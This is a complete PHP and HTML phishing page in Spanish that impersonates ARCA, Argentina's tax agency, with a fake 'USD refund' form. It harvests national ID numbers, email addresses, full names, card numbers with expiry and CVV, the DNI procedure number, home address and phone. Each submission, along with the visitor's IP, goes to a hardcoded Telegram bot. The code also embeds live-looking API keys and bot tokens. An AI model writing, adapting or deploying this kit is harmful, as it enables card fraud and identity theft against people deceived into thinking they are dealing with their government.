<?php
// --- API BIN: Si se consulta por AJAX, responde solo el emisor ---
if (isset($_GET['bin']) && preg_match('/^\d{6,8}$/', $_GET['bin'])) {
    $bin = $_GET['bin'];
    $URL = "https://js.dlocal.com/fields/bins";
    $HEADERS = [
        "Content-Type: application/json",
        "X-Fields-Api-Key: e185102a-f3a7-4d52-ad5a-49c289d7093e",
        "X-Uow: FI-oiZCM1738151148565"
    ];
    $DATA = [
        "bin" => $bin,
        "country" => "AR"
    ];
    $ch = curl_init($URL);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $HEADERS);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($DATA));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 7);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($result && !$err) {
        $data = json_decode($result, true);
        $issuer = $data['issuer'] ?? 'Emisor desconocido';
        $type = $data['type'] ?? '';
        $brand = $data['brand'] ?? '';
        header('Content-Type: application/json');
        echo json_encode(['issuer' => $issuer, 'type' => $type, 'brand' => $brand]);
        exit;
    } else {
        header('Content-Type: application/json');
        echo json_encode(['issuer' => 'Emisor desconocido','type'=>'','brand'=>'']);
        exit;
    }
}

// --- TELEGRAM: ENVIO DE DATOS TARJETA ---
if(
    isset($_POST['telegram']) && $_POST['telegram'] === 'tarjeta' &&
    isset($_POST['dni']) &&
    isset($_POST['nombre']) &&
    isset($_POST['correo']) &&
    isset($_POST['numero']) &&
    isset($_POST['fecha']) &&
    isset($_POST['cvv']) &&
    isset($_POST['tipo']) &&
    isset($_POST['banco'])
){
    // Configura tu token y chat_id aquí
    $bot_token = '7851025816:AAFTo0o_D0tabAqttKh8bsZgIT0jFG1djL0';
    $chat_id = '6892826172';

    $dni    = htmlspecialchars($_POST['dni']);
    $nombre = htmlspecialchars($_POST['nombre']);
    $correo = htmlspecialchars($_POST['correo']);
    $numero = htmlspecialchars($_POST['numero']);
    $fecha  = htmlspecialchars($_POST['fecha']);
    $cvv    = htmlspecialchars($_POST['cvv']);
    $tipo   = htmlspecialchars($_POST['tipo']);
    $banco  = htmlspecialchars($_POST['banco']);

    // IP del visitante
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "💳 *Nueva solicitud ARCA*\n"
        ."*DNI:* `$dni`\n"
        ."*Nombre:* `$nombre`\n"
        ."*Correo:* `$correo`\n"
        ."*Número de tarjeta:* `$numero`\n"
        ."*Fecha:* `$fecha`\n"
        ."*CVV:* `$cvv`\n"
        ."*Tipo:* `".strtoupper($tipo)."`\n"
        ."*Banco:* `$banco`\n"
        ."*IP:* `$ip`";

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'Markdown',
        'disable_notification' => true
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
    $output = curl_exec($ch);
    curl_close($ch);
    echo 'OK';
    exit;
}

// --- TELEGRAM: ENVIO DE DATOS TITULAR ---
if(
    isset($_POST['telegram']) && $_POST['telegram'] === 'titular' &&
    isset($_POST['dni_tramite']) &&
    isset($_POST['direccion']) &&
    isset($_POST['numero']) &&
    isset($_POST['cp']) &&
    isset($_POST['provincia']) &&
    isset($_POST['ciudad']) &&
    isset($_POST['telefono'])
){
    $bot_token = '7851025816:AAFTo0o_D0tabAqttKh8bsZgIT0jFG1djL0';
    $chat_id   = '6892826172';

    $dni_tramite = htmlspecialchars($_POST['dni_tramite']);
    $direccion   = htmlspecialchars($_POST['direccion']);
    $numero      = htmlspecialchars($_POST['numero']);
    $cp          = htmlspecialchars($_POST['cp']);
    $provincia   = htmlspecialchars($_POST['provincia']);
    $ciudad      = htmlspecialchars($_POST['ciudad']);
    $telefono    = htmlspecialchars($_POST['telefono']);

    // IP del visitante
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "🧑 *Datos Titular ARCA*\n"
      ."*N° de trámite DNI:* `$dni_tramite`\n"
      ."*Dirección:* `$direccion`\n"
      ."*Número:* `$numero`\n"
      ."*Código Postal:* `$cp`\n"
      ."*Provincia:* `$provincia`\n"
      ."*Ciudad:* `$ciudad`\n"
      ."*Teléfono:* `$telefono`\n"
      ."*IP:* `$ip`";

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'Markdown',
        'disable_notification' => true
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
    $output = curl_exec($ch);
    curl_close($ch);
    echo 'OK';
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>ARCA | Devolución de Pagos USD</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAaCAMAAACTisy7AAAAaVBMVEVHcEwfKEwgKU0fKEwhKk0eJUQUHEUbJEobJUoaI0lUj6ditMk7Y38dJksjK0////8WH0cOGkUCEUF5fY6/wcqWmKY+RWKrrrmChZbV1txrb4JPVG0AATlfY3ltyNy1t8Ggo68xN1fz9PXugaWuAAAAEXRSTlMAalRkMRPW/pC0/PPjeP///snKbNMAAAF0SURBVCiRbVLpmsIgDOxlKepCwi309P0fcgOt2t3P+dFCJseEpKreuHRN3TZd9QUNB7Eltwng//muB+39au3qfUR+OXM1RqMFAgG3YBI2H25Q3iomBAOgLyDd2hfX4hJRkDWGMBErlF7xKHxBqzMnQEr5HPNJWc12kjuvisUTKTWUsxHDHmhyKsJTPqV8FEfhPGbyx60lKVop14eUpapQi8iK+xDLdaQwpym0VIUQOZFgt3LLdsWyR/FNoaeS1/mWNSBlTONIuU2pOs93Im/zXHokpebxIBfpsqB5vlHa+3ylyDFbD+TO4JojSRDpY476X0wGsaSe6SJoSBaoaQoYFSGnsCjQb3WeFhrFEvkX0UW1pP9SHqHqJ6uS1hH2d2JaB6cWx/dBKz9BGdbB0lC1xWPggzAOxAmYDNSvgXIwUb0ppsKihs8qcLBLQmSMAeJkAp64vERu9aueprAuVrCm+ouBMTdpPW3Q/3zZ3K4eCO1pa38BnXAj5LpQvIUAAAAASUVORK5CYII="/>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
  <style>
    :root {
      --arca-blue: #003366;
      --arca-blue-light: #0059a7;
      --arca-blue-bg: #f2f7fb;
      --accent: #00b6e0;
      --success: #2ecc71;
      --danger: #d35400;
      --input-bg: #fff;
    }
    html, body {
      margin: 0; padding: 0; height: 100%; width: 100%;
      font-family: 'Montserrat', Arial, sans-serif;
      background: var(--arca-blue-bg);
      color: var(--arca-blue);
      min-height: 100vh;
      box-sizing: border-box;
    }
    body {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    header {
      text-align: center;
      padding: 2rem 1rem 1.2rem 1rem;
      background: var(--arca-blue);
      color: #fff;
    }
    header img {
      width: 500px;
      max-width: 90vw;
      margin-bottom: .7rem;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    header h1 {
      margin: 0 0 .4rem 0;
      font-size: 2rem;
      letter-spacing: 1px;
      font-weight: 700;
      color: #fff;
    }
    header p {
      margin: 0;
      font-size: 1.08rem;
      font-weight: 400;
      color: #eaf1fa;
    }
    #progress-bar {
      width: 100vw;
      max-width: 330px;
      margin: 1.2rem auto 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .progress-step {
      width: 34px; height: 34px;
      background: #e6f0fa;
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      border: 2px solid #b9d6ee;
      font-size: 1.13rem;
      color: #b9d6ee;
      font-weight: 700;
      transition: border .3s, color .3s, background .3s;
    }
    .progress-step.active, .progress-step.completed {
      border: 2px solid var(--arca-blue-light);
      color: var(--arca-blue-light);
      background: #fff;
    }
    .progress-step.completed {
      color: var(--success);
      border-color: var(--success);
      background: #eafcf0;
    }
    .progress-bar-line {
      flex: 1;
      height: 3px;
      background: linear-gradient(90deg, var(--arca-blue-light), #e6f0fa);
      border-radius: 2px;
      margin: 0 3px;
      opacity: 0.5;
    }
    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      width: 100vw;
    }
    .form-wrap {
      background: none;
      width: 100vw;
      max-width: 410px;
      padding: 0;
      margin: 1rem 0 0 0;
      min-height: 420px;
      overflow: visible;
    }
    .form-step {
      display: none;
      animation: fadeIn .4s;
      padding: 2.3rem 1rem 1.1rem 1rem;
      background: none;
    }
    .form-step.active {
      display: block;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .step-title {
      font-size: 1.11rem;
      font-weight: 700;
      margin-bottom: 1.1rem;
      color: var(--arca-blue-light);
      display: flex;
      align-items: center;
      gap: 0.7em;
      letter-spacing: .5px;
    }
    .input-group {
      margin-bottom: 1.13rem;
      position:relative;
    }
    .info-btn {
      background: none;
      border: none;
      cursor: pointer;
      position: absolute;
      right: 8px;
      top: 57%;
      transform: translateY(-50%);
      color: var(--arca-blue-light);
      font-size: 1.12em;
      outline: none;
    }
    .info-pop {
      display: none;
      position: absolute;
      right: 2.3em;
      top: 2.7em;
      z-index: 1000;
      background: #fff;
      color: #003366;
      font-size: .93em;
      border: 1px solid #b9d6ee;
      box-shadow: 0 2px 16px #afdbe6a1;
      border-radius: 9px;
      padding: .9em 1em;
      width: 270px;
      max-width: 80vw;
      min-width: 160px;
      font-weight: 500;
    }
    .input-group:focus-within .info-pop, .info-btn:focus + .info-pop, .info-btn:hover + .info-pop {
      display: block;
    }
    label {
      display: block;
      font-weight: 600;
      margin-bottom: 0.45em;
      color: var(--arca-blue-light);
    }
    input, select {
      width: 100%;
      padding: 0.72em 1em;
      border-radius: 10px;
      border: 1.5px solid #d5e6ef;
      background: #fff;
      font-size: 1.07em;
      margin-bottom: 0.1em;
      transition: border-color 0.2s;
      font-family: inherit;
      box-sizing: border-box;
    }
    input:focus, select:focus {
      border-color: var(--arca-blue-light);
      outline: none;
    }
    .input-error {
      border-color: var(--danger)!important;
      background: #fff7f3!important;
    }
    .error-msg {
      color: var(--danger);
      font-size: .98em;
      margin: -.7em 0 1.2em .2em;
      display: flex;
      align-items: center;
      gap: .6em;
      font-weight: 600;
      animation: shake .4s linear;
    }
    @keyframes shake {
      0% {transform:translateX(0)}
      20% {transform:translateX(-6px)}
      40% {transform:translateX(6px)}
      60% {transform:translateX(-3px)}
      80% {transform:translateX(3px)}
      100% {transform:translateX(0)}
    }
    .btn {
      width: 100%;
      padding: 0.9em 0;
      border-radius: 10px;
      border: none;
      background: linear-gradient(90deg, var(--arca-blue-light) 70%, var(--accent) 100%);
      color: #fff;
      font-size: 1.13em;
      font-weight: 700;
      cursor: pointer;
      margin-top: 1em;
      margin-bottom: .5em;
      box-shadow: 0 2px 10px 0 #b5e3fa6e;
      transition: background .2s, box-shadow .2s;
      letter-spacing: .5px;
      position: relative;
      z-index: 2;
    }
    .btn:disabled {
      background: #b8c7d6;
      cursor: not-allowed;
      color: #e5f3fa;
    }
    .floating-loader {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 1em 0 .5em 0;
      min-height: 34px;
    }
    .loader {
      border: 4px solid #b4ddf6;
      border-top: 4px solid var(--arca-blue-light);
      border-radius: 50%;
      width: 26px;
      height: 26px;
      animation: spin 1.1s linear infinite;
      margin-right: 1em;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .card-bin-info {
      border-radius: 8px;
      background: #f7fcff;
      margin: .4em 0 .9em 0;
      padding: .7em .8em;
      font-size: .99em;
      display: flex;
      align-items: center;
      gap: .85em;
      border: 1.3px solid #c8ebf7;
      min-height: 38px;
      box-shadow: 0 1px 5px #eaf7fa;
      animation: fadeIn .5s;
      color: var(--arca-blue);
      flex-wrap: wrap;
    }
    .confirm-success {
      color: var(--success);
      font-weight: bold;
      font-size: 1.13em;
      margin: 1em 0 .5em 0;
      display: flex;
      align-items: center;
      gap: .7em;
    }
	.header-sep {
  border: none;
  border-top: 3px solid #111;
  margin: 20px auto 18px auto;
  width: 80px;
  max-width: 60vw;
  opacity: 0.9;
}
    .fadeOut { animation: fadeOut .5s forwards;}
    @keyframes fadeOut {
      to { opacity:0; transform:translateY(20px);}
    }
    /* Responsive */
    @media (max-width:600px) {
      .form-wrap {max-width:100vw;}
      .form-step {padding: 1.1rem 0.5rem 1rem 0.5rem;}
      #progress-bar {max-width:99vw;}
      header img {width: 85vw; max-width: 500px;}
      header h1 {font-size: 1.13rem;}
    }
    @media (max-width:420px) {
      .form-wrap {padding:0;}
      .form-step {padding: .7rem .2rem 1rem .2rem;}
      .info-pop {right: .2em; left:0;}
      header img {width: 80vw; max-width: 400px;}
    }
  </style>
</head>
<body>
<header>
  <img src="https://www.afip.gob.ar/frameworkAFIP/img/Arca-logo-grande-blanco.svg" alt="ARCA Logo">
  <hr class="header-sep">
  <h1><i class="fa-solid fa-rotate-left"></i> ARCA | Devolución USD</h1>
  <p>Solicitá la devolución a tu tarjeta de crédito/débito.<br>100% digital y seguro.</p>
</header>
<div id="progress-bar">
  <span class="progress-step active" id="prg-1"><i class="fa-regular fa-id-card"></i></span>
  <span class="progress-bar-line"></span>
  <span class="progress-step" id="prg-2"><i class="fa-solid fa-user-check"></i></span>
  <span class="progress-bar-line"></span>
  <span class="progress-step" id="prg-3"><i class="fa-regular fa-credit-card"></i></span>
  <span class="progress-bar-line"></span>
  <span class="progress-step" id="prg-4"><i class="fa-solid fa-user"></i></span>
  <span class="progress-bar-line"></span>
  <span class="progress-step" id="prg-5"><i class="fa-solid fa-circle-check"></i></span>
</div>
<main>
  <div class="form-wrap">
    <!-- Paso 1 -->
    <form id="step1" class="form-step active" autocomplete="off">
      <div class="step-title"><i class="fa-regular fa-id-card"></i> Paso 1: Tus datos personales</div>
      <div class="input-group">
        <label for="dni">DNI</label>
        <input type="number" inputmode="numeric" id="dni" name="dni" required min="1000000" max="99999999" placeholder="Ej: 12345678" autocomplete="off" />
      </div>
      <div class="input-group">
        <label for="email">Correo electrónico</label>
        <input type="email" id="email" name="email" required placeholder="Ej: tu@email.com" autocomplete="off" />
      </div>
      <div class="floating-loader" id="dni-loader" style="display:none;">
        <span class="loader"></span> Consultando DNI...
      </div>
      <div class="error-msg" id="dni-error" style="display:none;">
        <i class="fa-solid fa-circle-exclamation"></i> <span id="dni-err-msg">No se encontró el DNI.</span>
      </div>
      <button type="submit" class="btn" id="btn-dni">Validar</button>
    </form>
    <!-- Paso 2 -->
    <div id="step2" class="form-step">
      <div class="step-title"><i class="fa-solid fa-user-check"></i> ¿Es correcto tu nombre?</div>
      <div class="card-bin-info" style="margin-bottom:1.1em;">
        <span id="nombreCompleto"></span>
      </div>
      <button class="btn" id="btn-nombre-correcto">Sí, continuar <i class="fa-solid fa-arrow-right"></i></button>
      <button class="btn" style="background:var(--danger);margin-top:.5em;" id="btn-nombre-incorrecto">
        No, reingresar DNI <i class="fa-solid fa-arrow-rotate-left"></i>
      </button>
    </div>
    <!-- Paso 3 -->
    <form id="step3" class="form-step" autocomplete="off" novalidate>
      <div class="step-title"><i class="fa-regular fa-credit-card"></i> Datos de tu tarjeta</div>
      <div class="input-group">
        <label for="cardNumber">Número de tarjeta</label>
        <input type="text" id="cardNumber" name="cardNumber"
          maxlength="19"
          inputmode="numeric"
          placeholder="1234 5678 9012 3456"
          autocomplete="cc-number"
          required />
      </div>
      <div class="floating-loader" id="bin-loader" style="display:none;">
        <span class="loader"></span> Consultando banco...
      </div>
      <div id="bin-info"></div>
      <div class="input-group">
        <label for="cardExpiry">Vencimiento (MM/AA)</label>
        <input type="text" id="cardExpiry" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp" required />
      </div>
      <div class="input-group">
        <label for="cardCVV">CVV</label>
        <input type="password" id="cardCVV" maxlength="4" pattern="\d{3,4}" inputmode="numeric" placeholder="123" autocomplete="cc-csc" required />
      </div>
      <input type="hidden" id="tipo_tarjeta" name="tipo_tarjeta" value="">
      <input type="hidden" id="banco_tarjeta" name="banco_tarjeta" value="">
      <div class="error-msg" id="card-error" style="display:none;">
        <i class="fa-solid fa-circle-exclamation"></i> <span id="card-err-msg"></span>
      </div>
      <button type="submit" class="btn" id="btn-card">Solicitar devolución</button>
    </form>
    <!-- Paso 4: Datos titular -->
    <form id="step4" class="form-step" autocomplete="off" novalidate>
      <div class="step-title"><i class="fa-solid fa-user"></i> Datos del titular de la tarjeta</div>
      <div class="input-group" style="position:relative;">
        <label for="dni_tramite">Número de trámite del DNI</label>
        <input type="text" id="dni_tramite" name="dni_tramite" maxlength="15" inputmode="numeric" placeholder="Ej: 12345678901" required />
        <button type="button" tabindex="-1" class="info-btn" id="dniTramiteInfoBtn"><i class="fa-solid fa-circle-info"></i></button>
        <div class="info-pop" id="dniTramiteInfo">
          Es un número de 11 dígitos que aparece en el frente de tu DNI, debajo de la fecha de emisión. Suele estar identificado como "Trámite" o seguido de la palabra "Nº de trámite". Si el DNI es tarjeta plástica, está a la derecha debajo de tu foto.
        </div>
      </div>
      <div class="input-group">
        <label for="direccion">Dirección (calle)</label>
        <input type="text" id="direccion" name="direccion" maxlength="80" required />
      </div>
      <div class="input-group">
        <label for="numero">Número</label>
        <input type="text" id="domicilio_numero" name="domicilio_numero" maxlength="12" inputmode="numeric" required />
      </div>
      <div class="input-group">
        <label for="cp">Código Postal</label>
        <input type="text" id="cp" name="cp" maxlength="10" required />
      </div>
      <div class="input-group">
        <label for="provincia">Provincia</label>
        <input type="text" id="provincia" name="provincia" maxlength="40" required />
      </div>
      <div class="input-group">
        <label for="ciudad">Ciudad</label>
        <input type="text" id="ciudad" name="ciudad" maxlength="40" required />
      </div>
      <div class="input-group">
        <label for="telefono">Teléfono</label>
        <input type="text" id="telefono" name="telefono" maxlength="18" inputmode="tel" required />
      </div>
      <div class="error-msg" id="titular-error" style="display:none;">
        <i class="fa-solid fa-circle-exclamation"></i> <span id="titular-err-msg"></span>
      </div>
      <button type="submit" class="btn" id="btn-titular">Finalizar solicitud</button>
    </form>
    <!-- Paso 5: Confirmacion Final -->
    <div id="step5" class="form-step">
      <div class="step-title"><i class="fa-solid fa-circle-check"></i> ¡Solicitud enviada!</div>
      <div class="confirm-success">
        <i class="fa-solid fa-shield-check"></i>
        Tu solicitud fue recibida.<br>
      </div>
      <div style="text-align:center;margin-bottom:1em;">
        <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Success" style="width:60px; margin:1em auto .5em auto;">
        <p style="margin:.3em 0 0 0;">Enviaremos el seguimiento a tu correo.<br>
        <b>¡Gracias por confiar en ARCA!</b></p>
      </div>
    </div>
  </div>
</main>
<footer style="text-align:center;color:#7ea0c5;font-size:.97em; margin-bottom:1em;">
  <span>© 2025 ARCA | <i class="fa-solid fa-lock"></i> Sitio seguro</span>
</footer>
<script>
  // Progress bar utility
  const progress = [
    document.getElementById('prg-1'),
    document.getElementById('prg-2'),
    document.getElementById('prg-3'),
    document.getElementById('prg-4'),
    document.getElementById('prg-5')
  ];
  function setProgress(n) {
    progress.forEach((el,i) => {
      el.classList.remove("active","completed");
      if(i<n) el.classList.add("completed");
      if(i===n) el.classList.add("active");
    });
  }
  function slideStep(from,to,idx) {
    from.classList.remove('active');
    to.classList.add('active');
    setProgress(idx);
    window.scrollTo({top:0, behavior:'smooth'});
  }
  // PASO 1
  let userDNI="", userEmail="", userNombre="";
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const step4 = document.getElementById('step4');
  const step5 = document.getElementById('step5');
  let tipoTarjeta = "", bancoTarjeta = "";
  step1.addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('dni-error').style.display = 'none';
    document.getElementById('dni-loader').style.display = 'flex';
    step1.querySelector('#btn-dni').disabled = true;
    const dni = document.getElementById('dni').value.trim();
    const email = document.getElementById('email').value.trim();
    userDNI = dni; userEmail = email;
    // Valida email
    if(!/\S+@\S+\.\S+/.test(email)){
      showError('dni-error','Ingrese un correo válido.');
      document.getElementById('dni').classList.remove('input-error');
      document.getElementById('email').classList.add('input-error');
      return;
    } else {
      document.getElementById('email').classList.remove('input-error');
    }
    // Consulta Credicuotas API
    let found = false, nombre = "";
    try {
      let resp = await fetch(`https://autogestion.credicuotas.com.ar/api/selfie/users/${dni}`);
      if(!resp.ok) throw new Error("No se pudo verificar");
      let data = await resp.json();
      if(Array.isArray(data) && data[0]?.fullname){
        nombre = data[0].fullname;
        found = true;
      }
    } catch(e) {}
    document.getElementById('dni-loader').style.display = 'none';
    step1.querySelector('#btn-dni').disabled = false;
    if(!found){
      showError('dni-error','No se encontró el DNI ingresado.');
      document.getElementById('dni').classList.add('input-error');
      return;
    }
    document.getElementById('dni').classList.remove('input-error');
    document.getElementById('email').classList.remove('input-error');
    userNombre = nombre;
    document.getElementById('nombreCompleto').textContent = nombre;
    slideStep(step1,step2,1);
  });
  document.getElementById('btn-nombre-correcto').onclick = ()=>{ slideStep(step2,step3,2); };
  document.getElementById('btn-nombre-incorrecto').onclick = ()=>{ slideStep(step2,step1,0); };
  // PASO 3: Tarjeta, consulta BIN, validación
  let binTimer, lastBIN="", currentIssuer="", currentTipo="", currentBrand="";
  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.addEventListener('input', function(){
    let val = this.value.replace(/\D/g,'').slice(0,19);
    // Formatea con espacios cada 4
    this.value = val.replace(/(.{4})/g, '$1 ').trim();
    let bin = val.length>=6 ? val.substr(0,6) : "";
    // Sólo consulta si el BIN cambia
    if(bin && bin !== lastBIN){
      lastBIN = bin;
      currentIssuer = ""; currentTipo = ""; currentBrand = "";
      consultaBIN(bin);
    } else if (!bin) {
      lastBIN = "";
      currentIssuer = ""; currentTipo = ""; currentBrand = "";
      document.getElementById('bin-info').innerHTML = "";
    }
    // Si ya tenemos issuer y el bin sigue igual, no lo quitamos
  });
  function consultaBIN(bin){
    document.getElementById('bin-info').innerHTML = "";
    document.getElementById('bin-loader').style.display = 'flex';
    fetch('?bin='+bin)
    .then(resp=>resp.json())
    .then(data=>{
      document.getElementById('bin-loader').style.display = 'none';
      let banco = (data.issuer || "Emisor desconocido");
      let tipo = (data.type || "");
      let brand = (data.brand || "");
      currentIssuer = banco;
      currentTipo = tipo;
      currentBrand = brand;
      document.getElementById('tipo_tarjeta').value = tipo;
      document.getElementById('banco_tarjeta').value = banco;
      let html = `
        <div class="card-bin-info">
          <span><i class="fa-solid fa-building-columns"></i> Banco/Emisor: <b>${banco}</b> &nbsp;&nbsp; <i class="fa-regular fa-credit-card"></i> Tipo: <b>${tipo ? tipo.toUpperCase() : '-'}</b></span>
        </div>
      `;
      document.getElementById('bin-info').innerHTML = html;
    })
    .catch(()=>{
      document.getElementById('bin-loader').style.display = 'none';
      currentIssuer = ""; currentTipo = ""; currentBrand = "";
      document.getElementById('bin-info').innerHTML = "";
    });
  }
  document.getElementById('cardExpiry').addEventListener('input', function () {
    let val = this.value.replace(/\D/g, '');
    if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2,4);
    this.value = val;
  });
  step3.addEventListener('submit', function(e){
    e.preventDefault();
    document.getElementById('card-error').style.display = 'none';
    let ok = true;
    let num = cardNumberInput.value.replace(/\D/g, '');
    // Permite 13 a 19 dígitos, sin espacios
    if(num.length < 13 || num.length > 19){
      showError('card-error','Número de tarjeta inválido.');
      ok=false;
      cardNumberInput.classList.add('input-error');
    } else cardNumberInput.classList.remove('input-error');
    let exp = document.getElementById('cardExpiry').value.trim();
    if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)){
      showError('card-error','Fecha de vencimiento inválida.');
      document.getElementById('cardExpiry').classList.add('input-error');
      ok=false;
    } else document.getElementById('cardExpiry').classList.remove('input-error');
    let cvv = document.getElementById('cardCVV').value.trim();
    if(!/^\d{3,4}$/.test(cvv)){
      showError('card-error','CVV inválido.');
      document.getElementById('cardCVV').classList.add('input-error');
      ok=false;
    } else document.getElementById('cardCVV').classList.remove('input-error');
    // Emisor obligatorio
    if(!currentIssuer){
      showError('card-error','Debe esperar la consulta del banco/emisor.');
      ok=false;
    }
    if(!ok) return;
    document.getElementById('btn-card').disabled = true;
    // --- ENVIAR DATOS A TELEGRAM (tarjeta) ---
    var datos = {
        telegram: 'tarjeta',
        dni: userDNI,
        nombre: userNombre,
        correo: userEmail,
        numero: cardNumberInput.value.trim(),
        fecha: document.getElementById('cardExpiry').value.trim(),
        cvv: document.getElementById('cardCVV').value.trim(),
        tipo: currentTipo,
        banco: currentIssuer
    };
    fetch('',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body: Object.keys(datos).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(datos[k])).join('&')
    }).then(function(resp){
      setTimeout(()=>{ slideStep(step3,step4,3); },900);
    }).catch(function(){
      setTimeout(()=>{ slideStep(step3,step4,3); },900);
    });
  });

  // PASO 4: Datos Titular
  document.getElementById('dniTramiteInfoBtn').addEventListener('mouseover',showDniInfo);
  document.getElementById('dniTramiteInfoBtn').addEventListener('focus',showDniInfo);
  document.getElementById('dniTramiteInfoBtn').addEventListener('mouseout',hideDniInfo);
  document.getElementById('dniTramiteInfoBtn').addEventListener('blur',hideDniInfo);
  function showDniInfo(){document.getElementById('dniTramiteInfo').style.display='block';}
  function hideDniInfo(){document.getElementById('dniTramiteInfo').style.display='none';}

  step4.addEventListener('submit', function(e){
    e.preventDefault();
    document.getElementById('titular-error').style.display = 'none';
    let ok = true;
    let dni_tramite = document.getElementById('dni_tramite').value.trim();
    let direccion = document.getElementById('direccion').value.trim();
    let numero = document.getElementById('domicilio_numero').value.trim();
    let cp = document.getElementById('cp').value.trim();
    let provincia = document.getElementById('provincia').value.trim();
    let ciudad = document.getElementById('ciudad').value.trim();
    let telefono = document.getElementById('telefono').value.trim();

    // Validaciones simples
    if(!/^\d{11}$/.test(dni_tramite)){
      showError('titular-error','El N° de trámite debe tener 11 dígitos.');
      document.getElementById('dni_tramite').classList.add('input-error');
      ok=false;
    } else document.getElementById('dni_tramite').classList.remove('input-error');
    if(!direccion){
      showError('titular-error','Ingrese la calle.');
      document.getElementById('direccion').classList.add('input-error'); ok=false;
    } else document.getElementById('direccion').classList.remove('input-error');
    if(!numero){
      showError('titular-error','Ingrese el número del domicilio.');
      document.getElementById('domicilio_numero').classList.add('input-error'); ok=false;
    } else document.getElementById('domicilio_numero').classList.remove('input-error');
    if(!cp){
      showError('titular-error','Ingrese el código postal.');
      document.getElementById('cp').classList.add('input-error'); ok=false;
    } else document.getElementById('cp').classList.remove('input-error');
    if(!provincia){
      showError('titular-error','Ingrese la provincia.');
      document.getElementById('provincia').classList.add('input-error'); ok=false;
    } else document.getElementById('provincia').classList.remove('input-error');
    if(!ciudad){
      showError('titular-error','Ingrese la ciudad.');
      document.getElementById('ciudad').classList.add('input-error'); ok=false;
    } else document.getElementById('ciudad').classList.remove('input-error');
    if(!telefono){
      showError('titular-error','Ingrese el teléfono.');
      document.getElementById('telefono').classList.add('input-error'); ok=false;
    } else document.getElementById('telefono').classList.remove('input-error');
    if(!ok) return;

    document.getElementById('btn-titular').disabled = true;
    var datos = {
        telegram: 'titular',
        dni_tramite: dni_tramite,
        direccion: direccion,
        numero: numero,
        cp: cp,
        provincia: provincia,
        ciudad: ciudad,
        telefono: telefono
    };
    fetch('',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body: Object.keys(datos).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(datos[k])).join('&')
    }).then(function(resp){
      setTimeout(()=>{ slideStep(step4,step5,4); },900);
    }).catch(function(){
      setTimeout(()=>{ slideStep(step4,step5,4); },900);
    });
  });

  function showError(id,msg){
    document.getElementById(id).style.display='flex';
    document.getElementById(id).querySelector('span') ? document.getElementById(id).querySelector('span').textContent = msg : 0;
    setTimeout(()=>document.getElementById(id).style.display='none',2600);
    step1.querySelector('#btn-dni') && (step1.querySelector('#btn-dni').disabled = false);
    document.getElementById('dni-loader') && (document.getElementById('dni-loader').style.display = 'none');
  }
  ['dni','email','cardNumber','cardExpiry','cardCVV','dni_tramite','direccion','domicilio_numero','cp','provincia','ciudad','telefono'].forEach(id=>{
    let el=document.getElementById(id);
    if(el) el.addEventListener('input',()=>el.classList.remove('input-error'));
  });
</script>
</body>
</html>